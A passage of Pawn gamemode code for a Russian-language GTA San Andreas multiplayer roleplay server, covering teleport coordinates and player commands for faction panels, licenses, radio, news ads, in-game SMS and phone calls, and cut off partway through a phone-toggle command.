	case 56: { SetPlayerPos(playerid,204.332993,-166.694992,1000.578979); SetPlayerInterior(playerid,14); }
	case 57: { SetPlayerPos(playerid,207.054993,-138.804993,1003.519958); SetPlayerInterior(playerid,3); }
	case 58: { SetPlayerPos(playerid,203.778000,-48.492397,1001.799988); SetPlayerInterior(playerid,1); }
	case 59: { SetPlayerPos(playerid,226.293991,-7.431530,1002.259949); SetPlayerInterior(playerid,5); }
	case 60: { SetPlayerPos(playerid,161.391006,-93.159156,1001.804687); SetPlayerInterior(playerid,18); }
	case 61: { SetPlayerPos(playerid,493.390991,-22.722799,1000.686951); SetPlayerInterior(playerid,17); }
	case 62: { SetPlayerPos(playerid,501.980988,-69.150200,998.834961); SetPlayerInterior(playerid,11); }
	case 63: { SetPlayerPos(playerid,-227.028000,1401.229980,27.769798); SetPlayerInterior(playerid,18); }
	case 64: { SetPlayerPos(playerid,460.099976,-88.428497,999.621948); SetPlayerInterior(playerid,4); }
	case 65: { SetPlayerPos(playerid,454.973950,-110.104996,999.717957); SetPlayerInterior(playerid,5); }
	case 66: { SetPlayerPos(playerid,452.489990,-18.179699,1001.179993); SetPlayerInterior(playerid,1); }
	case 67: { SetPlayerPos(playerid,681.474976,-451.150970,-25.616798); SetPlayerInterior(playerid,1); }
	case 68: { SetPlayerPos(playerid,366.923980,-72.929359,1001.507812); SetPlayerInterior(playerid,10); }
	case 69: { SetPlayerPos(playerid,365.672974,-10.713200,1001.869995); SetPlayerInterior(playerid,9); }
	case 70: { SetPlayerPos(playerid,372.351990,-131.650986,1001.449951); SetPlayerInterior(playerid,5); }
	case 71: { SetPlayerPos(playerid,377.098999,-192.439987,1000.643982); SetPlayerInterior(playerid,17); }
	case 72: { SetPlayerPos(playerid,244.411987,305.032990,999.231995); SetPlayerInterior(playerid,1); }
	case 73: { SetPlayerPos(playerid,271.884979,306.631989,999.325989); SetPlayerInterior(playerid,2); }
	case 74: { SetPlayerPos(playerid,291.282990,310.031982,999.154968); SetPlayerInterior(playerid,3); }
	case 75: { SetPlayerPos(playerid,302.181000,300.722992,999.231995); SetPlayerInterior(playerid,4); }
	case 76: { SetPlayerPos(playerid,322.197998,302.497986,999.231995); SetPlayerInterior(playerid,5); }
	case 77: { SetPlayerPos(playerid,346.870025,309.259033,999.155700); SetPlayerInterior(playerid,6); }
	case 78: { SetPlayerPos(playerid,-959.873962,1952.000000,9.044310); SetPlayerInterior(playerid,17); }
	case 79: { SetPlayerPos(playerid,388.871979,173.804993,1008.389954); SetPlayerInterior(playerid,3); }
	case 80: { SetPlayerPos(playerid,220.4109,1862.277,13.147); SetPlayerInterior(playerid,0); }
	case 81: { SetPlayerPos(playerid,772.112000,-3.898650,1000.687988); SetPlayerInterior(playerid,5); }
	case 82: { SetPlayerPos(playerid,774.213989,-48.924297,1000.687988); SetPlayerInterior(playerid,6); }
	case 83: { SetPlayerPos(playerid,773.579956,-77.096695,1000.687988); SetPlayerInterior(playerid,7); }
	case 84: { SetPlayerPos(playerid,1527.229980,-11.574499,1002.269958); SetPlayerInterior(playerid,3); }
	case 85: { SetPlayerPos(playerid,1523.509888,-47.821198,1002.269958); SetPlayerInterior(playerid,2); }
	case 86: { SetPlayerPos(playerid,2496.049805,-1693.929932,1014.750000); SetPlayerInterior(playerid,3); }
	case 87: { SetPlayerPos(playerid,1263.079956,-785.308960,1091.959961); SetPlayerInterior(playerid,5); }
	case 88: { SetPlayerPos(playerid,1291.725341,-788.319885,96.460937); SetPlayerInterior(playerid,0); }
	case 89: { SetPlayerPos(playerid,516.650,-18.611898,1001.459961); SetPlayerInterior(playerid,3); }
	case 90: { SetPlayerPos(playerid,2464.109863,-1698.659912,1013.509949); SetPlayerInterior(playerid,2); }
	case 91: { SetPlayerPos(playerid,2526.459961,-1679.089966,1015.500000); SetPlayerInterior(playerid,1); }
	case 92: { SetPlayerPos(playerid,2543.659912,-1303.629883,1025.069946); SetPlayerInterior(playerid,2); }
	case 93: { SetPlayerPos(playerid,1212.019897,-28.663099,1001.089966); SetPlayerInterior(playerid,3); }
	case 94: { SetPlayerPos(playerid,744.542969,1437.669922,1102.739990); SetPlayerInterior(playerid,6); }
	case 95: { SetPlayerPos(playerid,1204.809937,-11.586800,1001.089966); SetPlayerInterior(playerid,2); }
	case 96: { SetPlayerPos(playerid,1204.809937,13.586800,1001.089966); SetPlayerInterior(playerid,2); }
	case 97: { SetPlayerPos(playerid,940.921997,-17.007000,1001.179993); SetPlayerInterior(playerid,3); }
	case 98: { SetPlayerPos(playerid,964.106995,-53.205498,1001.179993); SetPlayerInterior(playerid,3); }
	case 99: { SetPlayerPos(playerid,-2661.009766,1415.739990,923.305969); SetPlayerInterior(playerid,3); }
	case 100: { SetPlayerPos(playerid,-2637.449951,1404.629883,906.457947); SetPlayerInterior(playerid,3); }
	case 101: { SetPlayerPos(playerid,-735.5619504,484.351318,1371.952270); SetPlayerInterior(playerid,1); }
	case 102: { SetPlayerPos(playerid,-794.8064,491.6866,1376.195); SetPlayerInterior(playerid,1); }
	case 103: { SetPlayerPos(playerid,-835.2504,500.9161,1358.305); SetPlayerInterior(playerid,1); }
	case 104: { SetPlayerPos(playerid,-813.431518,533.231079,1390.782958); SetPlayerInterior(playerid,1); }
	case 105: { SetPlayerPos(playerid,2350.339844,-1181.649902,1028.000000); SetPlayerInterior(playerid,5); }
	case 106: { SetPlayerPos(playerid,2807.619873,-1171.899902,1025.579956); SetPlayerInterior(playerid,8); }
	case 107: { SetPlayerPos(playerid,318.564972,1118.209961,1083.979980); SetPlayerInterior(playerid,5); }
	case 108: { SetPlayerPos(playerid,1412.639893,-1.787510,1000.931946); SetPlayerInterior(playerid,1); }
	case 109: { SetPlayerPos(playerid,1302.519897,-1.787510,1000.931946); SetPlayerInterior(playerid,18); }
	case 110: { SetPlayerPos(playerid,2522.0,-1673.383911,14.8); SetPlayerInterior(playerid,0); }
	case 111: { SetPlayerPos(playerid,-219.322601,1410.444824,27.773437); SetPlayerInterior(playerid,18); }
	case 112: { SetPlayerPos(playerid,2324.419922,-1147.539917,1050.719971); SetPlayerInterior(playerid,12); }
	case 113: { SetPlayerPos(playerid,-972.4957,1060.983,1358.914); SetPlayerInterior(playerid,10); }
	case 114: { SetPlayerPos(playerid,411.625977,-21.433298,1001.799988); SetPlayerInterior(playerid,2); }
	case 115: { SetPlayerPos(playerid,418.652985,-82.639793,1001.959961); SetPlayerInterior(playerid,3); }
	case 116: { SetPlayerPos(playerid,412.021973,-52.649899,1001.959961); SetPlayerInterior(playerid,12); }
	case 117: { SetPlayerPos(playerid,-204.439987,-26.453999,1002.299988); SetPlayerInterior(playerid,16); }
	case 118: { SetPlayerPos(playerid,-204.439987,-8.469600,1002.299988); SetPlayerInterior(playerid,17); }
	case 119: { SetPlayerPos(playerid,-204.439987,-43.652496,1002.299988); SetPlayerInterior(playerid,3); }
	case 120: { SetPlayerPos(playerid,246.783997,63.900200,1003.639954); SetPlayerInterior(playerid,6); }
	case 121: { SetPlayerPos(playerid,246.375992,109.245995,1003.279968); SetPlayerInterior(playerid,10); }
	case 122: { SetPlayerPos(playerid,288.745972,169.350998,1007.179993); SetPlayerInterior(playerid,3); }
	case 123: { SetPlayerPos(playerid,1494.429932,1305.629883,1093.289917); SetPlayerInterior(playerid,3); }
	case 124: { SetPlayerPos(playerid,-2029.719971,-115.067993,1035.169922); SetPlayerInterior(playerid,3); }
	case 125: { SetPlayerPos(playerid,420.484985,2535.589844,10.020289); SetPlayerInterior(playerid,10); }
	case 126: { SetPlayerPos(playerid,-2184.751464,2413.111816,5.156250); SetPlayerInterior(playerid,0); }
	case 127: { SetPlayerPos(playerid,-1397.782470,-203.723114,1051.346801); SetPlayerInterior(playerid,7); }
	case 128: { SetPlayerPos(playerid,-1398.103515,933.445434,1041.531250); SetPlayerInterior(playerid,15); }
	case 129: { SetPlayerPos(playerid,-1428.809448,-663.595886,1060.219848); SetPlayerInterior(playerid,4); }
	case 130: { SetPlayerPos(playerid,-1486.861816,1642.145996,1060.671875); SetPlayerInterior(playerid,14); }
	case 131: { SetPlayerPos(playerid,-1401.830000,107.051300,1032.273000); SetPlayerInterior(playerid,1); }
	case 132: { SetPlayerPos(playerid,1382.615600,2184.345703,11.023437); SetPlayerInterior(playerid,0); }
	case 133: { SetPlayerPos(playerid,297.9414,-64.3876,1001.5156); SetPlayerInterior(playerid,4); }
	case 134: { SetPlayerPos(playerid,302.1602,-164.7588,999.6105); SetPlayerInterior(playerid,6); } }
	SendMes(playerid, COLOR_ORANGE, "Вы были телепортированы в локацию: %i", params[0]);
	return true;
}

CMD:fpanel(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pLeader] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	new helper[MAX_PLAYER_NAME];
	if(!strcmp(FracInfo[PlayerInfo[playerid][pLeader]][fAssistant],"None",true)) helper = "Нет";
	else format(helper, MAX_PLAYER_NAME, "{9ACD32}%s",FracInfo[PlayerInfo[playerid][pLeader]][fAssistant]);
	format(totalstring, 512, "{ffffff}Заместитель:\t\t\t{FF6347}%s{ffffff}\nРазрешение принимать:\t%s\n{ffffff}Разрешение увольнять: \t%s{ffffff}\nРазрешение повышать:\t%s{ffffff}\nРазрешение понижать:\t%s",
	helper,
	(FracInfo[PlayerInfo[playerid][pLeader]][fHelper][0]==0)?("{FF6347}Нет"):("{9ACD32}Да"),
	(FracInfo[PlayerInfo[playerid][pLeader]][fHelper][1]==0)?("{FF6347}Нет"):("{9ACD32}Да"),
	(FracInfo[PlayerInfo[playerid][pLeader]][fHelper][2]==0)?("{FF6347}Нет"):("{9ACD32}Да"),
	(FracInfo[PlayerInfo[playerid][pLeader]][fHelper][3]==0)?("{FF6347}Нет"):("{9ACD32}Да"));
	ShowPlayerDialog(playerid, D_FRACMENU+4, 2, "Панель", totalstring, "Принять", "Отмена");
	return true;
}

CMD:mpanel(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMember] == F_MAYOR && PlayerInfo[playerid][pRank] >= 3)
	{
		if(PlayerInfo[playerid][pRank] == 3) SetPVarInt(playerid, "MinisterFrac", F_HOSPITAL), ShowPlayerDialog(playerid, D_MFRAC, 2, "Панель", MinisterText, "Принять", "Отмена");
		else if(PlayerInfo[playerid][pRank] == 4) ShowPlayerDialog(playerid, D_MFRAC+1, 2, "Панель", "Организация №1 - ЛСПД\nОрганизация №2 - СФПД", "Принять", "Отмена");
		else if(PlayerInfo[playerid][pRank] == 5) SetPVarInt(playerid, "MinisterFrac", F_ARMY), ShowPlayerDialog(playerid, D_MFRAC, 2, "Панель", MinisterText, "Принять", "Отмена");
		else if(PlayerInfo[playerid][pRank] == 10) ShowPlayerDialog(playerid, D_MFRAC+1, 2, "Панель", "Организация №1 - ЛСПД\nОрганизация №2 - СФПД\nОрганизация №3 - ФБР", "Принять", "Отмена");
		else if(PlayerInfo[playerid][pRank] == 11) ShowPlayerDialog(playerid, D_MFRAC+1, 2, "Панель", "Организация №1 - ЛСПД\nОрганизация №2 - СФПД\nОрганизация №3 - ФБР\nОрганизация №4 - Зона 51\nОрганизация №5 - МЧС", "Принять", "Отмена");
		else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:givelic(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMember] == F_LIC)
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /givelic [id игрока]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
		if(IsPlayerInRangeOfPlayer(15.0, playerid, params[0]))
		{
			ShowPlayerDialog(playerid, D_LIC, 2, "Панель", "Выдать водительские права\nВыдать лицензию на судоходство\nВыдать лицензию на полеты\nВыдать лицензию на рыболовлю\nВыдать лицензию на оружие\nВыдать лицезнию на бизнес", "Принять", "Отмена");
			SetPVarInt(playerid, "LicName", params[0]);
		}
		else SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:agivelic(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /agivelic [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	ShowPlayerDialog(playerid, D_LIC+2, 2, "Панель", "Выдать водительские права\nВыдать лицензию на судоходство\nВыдать лицензию на полеты\nВыдать лицензию на рыболовлю\nВыдать лицензию на оружие\nВыдать лицезнию на бизнес", "Принять", "Отмена");
	SetPVarInt(playerid, "LicName", params[0]);
	return true;
}

CMD:take(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if((PlayerInfo[playerid][pMember] == F_POLICE_LS || PlayerInfo[playerid][pMember] == F_POLICE_SF || PlayerInfo[playerid][pMember] == F_FBI
				|| PlayerInfo[playerid][pMember] == F_LIC) && PlayerInfo[playerid][pRank] >= 3)
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /take [id игрока]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
		if(IsPlayerInRangeOfPlayer(8.0, playerid, params[0]))
		{
			if(PlayerInfo[playerid][pMember] == F_LIC) ShowPlayerDialog(playerid, D_LIC+1, 2, "Панель", "Отобрать водительские права\nОтобрать лицензию на судоходство\nОтобрать лицензию на полеты\nОтобрать лицензию на рыболовлю\nОтобрать лицензию на оружие", "Принять", "Отмена");
			else ShowPlayerDialog(playerid, D_LIC+1, 2, "Панель", "Отобрать водительские права\nОтобрать лицензию на судоходство\nОтобрать лицензию на полеты\nОтобрать лицензию на рыболовлю\nОтобрать лицензию на оружие\nОтобрать материалы\nОтобрать наркотики", "Принять", "Отмена");
			SetPVarInt(playerid, "LicName", params[0]);
		}
		else SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:atake(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /atake [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	ShowPlayerDialog(playerid, D_LIC+3, 2, "Панель", "Отобрать водительские права\nОтобрать лицензию на судоходство\nОтобрать лицензию на полеты\nОтобрать лицензию на рыболовлю\nОтобрать лицензию на оружие\nОтобрать материалы\nОтобрать наркотики", "Принять", "Отмена");
	SetPVarInt(playerid, "LicName", params[0]);
	return true;
}

CMD:radio(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	ShowPlayerDialog(playerid, D_NMENU+3, 2, "Радио", "{ffffff}Радио №1 - {8D8DFF}"Namesitet" News\n{FF6347}Выключить", "Принять", "Отмена");
	return true;
}

CMD:sradio(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerRadio[playerid] == 1)
	{
		PlayerRadio[playerid] = 0;
		SendClientMessage(playerid,COLOR_YELLOW,"Вы отключили радио!");
		SetPlayerRadio(playerid);
	}
	else
	{
		PlayerRadio[playerid] = 1;
		SendClientMessage(playerid,COLOR_YELLOW,"Вы включили радио "Namesitet"!");
		SetPlayerRadio(playerid);
	}
	return true;
}

CMD:n(playerid,params[])return cmd_news(playerid,params);
CMD:news(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMember] == F_UNITEDNEWS)
	{
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == VEHICLE_NEWS_ONE || GetVehicleModel(GetPlayerVehicleID(playerid)) == VEHICLE_NEWS_TWO || IsPlayerInRangeOfPoint(playerid, 10.0,1255.4565,-804.6594,1084.0151)) NewsPanel(playerid);
		else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в специализированном транспорте!");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:ad(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	new string[128];
	if(PlayerInfo[playerid][pMuted] > 0) return SendClientMessage(playerid, COLOR_PURPLE, PlayerHaveMuteTime);
	if(PlayerInfo[playerid][pLevel] == 1 &&  PlayerInfo[playerid][pTime] < 4) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен поиграть на сервере минимум 4 часа!");
	if(PlayerInfo[playerid][pPhone][0] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете телефоном!");
	if(PlayerInfo[playerid][pNews] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы должны быть переключены на какую-либо станцию!");
	if(TOTALADVERT[PlayerInfo[playerid][pNews]-1] >= 30) return SendClientMessage(playerid, COLOR_GREY, "Слишком много объявлений! Повторите попытку позже!");
	if(AdvertTime_ > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Посылать объявление можно раз в 15 секунд!");
	if(sscanf(params, "s[60]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /ad [текст]");
	if(GetMoney(playerid) < strlen(params[0])*AdvertPrice[PlayerInfo[playerid][pNews]-1]) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoney);
	TOTALADVERT[PlayerInfo[playerid][pNews]-1]++;
	strmid(AdvertInfo[TOTALADVERT[PlayerInfo[playerid][pNews]-1]][PlayerInfo[playerid][pNews]-1][aText],params[0],0,strlen(params[0]),128);
	strmid(AdvertInfo[TOTALADVERT[PlayerInfo[playerid][pNews]-1]][PlayerInfo[playerid][pNews]-1][aName],PlayerInfo[playerid][pSendername],0,strlen(PlayerInfo[playerid][pSendername]),MAX_PLAYER_NAME);
	AdvertInfo[TOTALADVERT[PlayerInfo[playerid][pNews]-1]][PlayerInfo[playerid][pNews]-1][aPhone] = PlayerInfo[playerid][pPhone][1];
	GiveMoney(playerid, -strlen(params[0])*AdvertPrice[PlayerInfo[playerid][pNews]-1]);
	if(PlayerInfo[playerid][pNews] == NEWS_UNITED) { FracBank[8] +=strlen(params[0])*AdvertPrice[PlayerInfo[playerid][pNews]-1]; SetOtherInt("ntoday", FracBank[8]); }
	SendClientMessage(playerid, COLOR_LIGHTRED, "Ваше объявление было отправлено на обработку");
	format(string, 128, "~r~Paid %d$~n~~w~Message contained: %d Characters", strlen(params[0])*AdvertPrice[PlayerInfo[playerid][pNews]-1], strlen(params[0]));
	GameTextForPlayer(playerid, string, 5000, 5);
	AdvertTime_ = gettime() + 15;
	return true;
}
CMD:npanel(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pLeader] == F_UNITEDNEWS || PlayerInfo[playerid][pMember] == F_UNITEDNEWS && strcmp(PlayerInfo[playerid][pSendername],FracInfo[PlayerInfo[playerid][pMember]][fAssistant],true) == 0)
	{
		ShowPlayerDialog(playerid, D_NMENU+4, 2, "Панель", "Установить цену за звонок\nУстановить цену за СМС\nУстановить цену за объявление", "Принять", "Отмена");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:sll(playerid, params[])
{
    if(PlayerInfo[playerid][pLeader] > 0){
	SlivList(playerid);}
	return 1;
}
CMD:sms(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	new string[256];
    if(PlayerInfo[playerid][pMuted] > 0) return SendMes(playerid, COLOR_PURPLE, PlayerHaveMuteTime);
   	if(Phone[playerid] == false) return SendMes(playerid, COLOR_GREY, "У вас выключен телефон!");
    if(PlayerInfo[playerid][pPhone][0] == 0) return SendMes(playerid, COLOR_GREY, "Вы не владеете телефоном!");
    if(sscanf(params, "is[60]", params[0], params[1])) return SendMes(playerid, COLOR_WHITE, "Введите: /sms [номер] [текст]");
    if(params[0] < 1 || params[0] > 9999999) return SendMes(playerid, COLOR_GREY, "Неверный номер телефона!");
    if(params[0] == PlayerInfo[playerid][pPhone][1]) return SendMes(playerid, COLOR_GREY, "Вы не можете отправить сообщение самому себе!");
	if(params[0] == TODAY_NUMBER)
	{
	    if(PlayerInfo[playerid][pNews] != NEWS_UNITED) return SendMes(playerid, COLOR_GREY, "Вы должны слушать радио: %s", FracInfo[F_UNITEDNEWS][fName]);
		if(EtherSms[PlayerInfo[playerid][pNews]-1] == false) return SendMes(playerid, COLOR_GREY, "Радио не принимает СМС!");
		if(PlayerInfo[playerid][pBank] < SmsPrice[PlayerInfo[playerid][pNews]-1]) return SendMes(playerid, COLOR_GREY, YouDoNotHaveEnoughMoneyBank);

		foreach (new i : Player)
		{
		    if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
		    if(Ether[i] == true && PlayerInfo[i][pMember] == F_UNITEDNEWS)
		    {
		        PlayerInfo[playerid][pBank] -= SmsPrice[PlayerInfo[playerid][pNews]-1];
		        FracBank[8] += SmsPrice[PlayerInfo[playerid][pNews]-1];
		        SetOtherInt("ntoday", FracBank[8]);
				PlayerPlaySound(i, 1052, 0.0, 0.0, 0.0);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				SendMes(i, COLOR_YELLOW, "SMS: %s. Отправитель: %s", params[1], sendername(playerid));
    			SendMes(playerid, COLOR_YELLOW, "SMS: %s. Получатель: "Namesitetx" News", params[1]);
    			SendMes(playerid, COLOR_WHITE, "Ваше сообщение доставлено");
				format(string, 90, "%s достает мобильный телефон", sendername(playerid));
				ProxDetectorNew(playerid,30.0,COLOR_PURPLE,string);
				break;
		    }
		}
		return true;
	}
	new full;

	foreach (new i : Player)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
		if(params[0] == PlayerInfo[i][pPhone][1])
		{
		    if(Phone[i] == false) return SendMes(playerid, COLOR_GREY, "Игрок выключил телефон!");
			PlayerPlaySound(i, 1052, 0.0, 0.0, 0.0);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			SendMes(i, COLOR_YELLOW, "SMS: %s. Отправитель: %s Тел.[%i]", params[1], sendername(playerid), PlayerInfo[playerid][pPhone][1]);
			SendMes(playerid, COLOR_YELLOW, "SMS: %s. Получатель: %s Тел.[%i]", params[1], sendername(i),PlayerInfo[i][pPhone][1]);
			SendMes(playerid, COLOR_WHITE, "Ваше сообщение доставлено");
			format(string, 90, "%s достает мобильный телефон", sendername(playerid));
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,string);
			full++;
   			break;
		}
	}
	if(full == 0) return SendMes(playerid, COLOR_GREY, "Игрок с данным номером не найден!");
	return true;
}

CMD:c(playerid,params[])return cmd_call(playerid,params);
CMD:call(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMuted] > 0) return SendClientMessage(playerid, COLOR_PURPLE, PlayerHaveMuteTime);
	if(Phone[playerid] == false) return SendClientMessage(playerid, COLOR_GREY, "У вас выключен телефон!");
	if(Mobile[playerid] != -1) return SendClientMessage(playerid, COLOR_GREY, "Вы уже разговариваете по телефону!");
	if(PlayerInfo[playerid][pPhone][0] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете телефоном!");
	if(sscanf(params, "i", params[0])) return ShowPlayerDialog(playerid, D_HEAL+3, 2, "Сервис", "- Вызвать механика\n- Вызвать такси\n- Вызвать мед. помошь\n- Вызвать полицию", "Принять", "Отмена");
	if(params[0] < 0 || params[0] > 9999999) return SendClientMessage(playerid, COLOR_GREY, "Неверный номер телефона!");
	if(params[0] == PlayerInfo[playerid][pPhone][1]) return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь позвонить самому себе!");
	//if(PlayerInfo[playerid][pBank] < 1) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoneyBank);
	new string[128];
	new full;
	foreach(new i:Player)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
		if(params[0] == TODAY_NUMBER)
		{
			if(Ether[playerid] == true) return SendClientMessage(playerid, COLOR_GREY, "Ошибка! Действие невозможно!");
			if(PlayerInfo[playerid][pNews] != NEWS_UNITED) return SendMes(playerid, COLOR_GREY, "Вы должны слушать радио: %s", FracInfo[F_UNITEDNEWS][fName]);
			if(EtherCall[PlayerInfo[playerid][pNews]-1] == false) return SendClientMessage(playerid, COLOR_GREY, "Радио не принимает звонков!");
			if(Ether[i] == true && PlayerInfo[i][pMember] == F_UNITEDNEWS)
			{
				if(Mobile[i] != -1) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже разговаривает по телефону!");
				Mobile[playerid] = i;
				SendMes(i, COLOR_WHITE, "Ваc вызывает: %s. Чтобы ответить, введите: /P", PlayerInfo[playerid][pSendername]);
				format(totalstring, 90, "У %s звонит мобильный телефон", PlayerInfo[i][pSendername]);
				ProxDetectorNew(i,30.0,COLOR_PURPLE,totalstring);
				PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
				SendClientMessage(playerid, COLOR_WHITE, "Чтобы повесить трубку, введите: /H");
				if(!IsPlayerInAnyVehicle(playerid)) SetPlayerSpecialAction(playerid, 11);
				CellTime[playerid] = 0;
				full++;
				return true;
			}
		}
		if(params[0] == PlayerInfo[i][pPhone][1] || PlayerInfo[params[0]][pPhone] != 0)
		{
			if(Phone[i] == false) return SendClientMessage(playerid, COLOR_GREY, "Игрок выключил телефон!");
			if(Mobile[i] != -1) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже разговаривает по телефону!");
			if(Ether[i] == true) return SendClientMessage(playerid, COLOR_GREY, "Ошибка! Действие невозможно!");
			Mobile[playerid] = i;
			SendMes(i, COLOR_WHITE, "Ваc вызывает: %s. Чтобы ответить, введите: /P", PlayerInfo[playerid][pSendername]);
			format(string, 90, "У %s звонит мобильный телефон", PlayerInfo[i][pSendername]);
			ProxDetectorNew(i,30.0,COLOR_PURPLE,string);
			PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
			SendClientMessage(playerid, COLOR_WHITE, "Чтобы повесить трубку, введите: /H");
			if(!IsPlayerInAnyVehicle(playerid)) SetPlayerSpecialAction(playerid, 11);
			CellTime[playerid] = 0;
			full++;
			break;
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "Ошибка!");
		}
	}
	if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок с данным номером не найден!");
	return true;
}

CMD:p(playerid,params[])return cmd_pickup(playerid,params);
CMD:pickup(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(Mobile[playerid] != -1) return SendClientMessage(playerid, COLOR_GREY, "Вы уже разговариваете по телефону!");
	foreach(new i:Player)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
		if(Mobile[i] == playerid)
		{
			if(Ether[playerid] == true) CallNews[PlayerInfo[playerid][pNews]-1]++, EtherCalled[i] = true;
			Mobile[playerid] = i;
			SendMes(i, COLOR_GRAD2, "%s поднял трубку мобильного", PlayerInfo[playerid][pSendername]);
			format(totalstring, 90, "%s ответил на звонок", PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,totalstring);
			if(!IsPlayerInAnyVehicle(playerid)) SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
			return true;
		}
	}
	return true;
}

CMD:h(playerid,params[])return cmd_hangup(playerid,params);
CMD:hangup(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(Mobile[playerid] == -1) return SendClientMessage(playerid, COLOR_GREY, "Вы не разговариваете по телефону!");
	new caller = Mobile[playerid];
	SendClientMessage(caller, COLOR_GRAD2, "Абонент положил трубку");
	SetPlayerSpecialAction(caller,SPECIAL_ACTION_STOPUSECELLPHONE);
	CellTime[caller] = -1;
	CellTime[playerid] = -1;
	Mobile[caller] = -1;
	if(EtherCalled[playerid] == true) EtherCalled[playerid] = false;
	if(EtherCalled[caller] == true) EtherCalled[caller] = false;
	SendClientMessage(playerid,  COLOR_GRAD2, "Вы положили трубку");
	Mobile[playerid] = -1;
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
	DeletePVar(playerid, "CallTime");
	DeletePVar(caller, "CallTime");
	return true;
}

CMD:togphone(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pPhone][0] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете телефоном!");
	if(PlayerInfo[playerid][pAdmin] > 0 && AdminLogged[playerid] == true || PlayerInfo[playerid][pLeader] > 0 || PlayerInfo[playerid][pVIP] == true)
	{
		if(Phone[playerid] == true)
		{
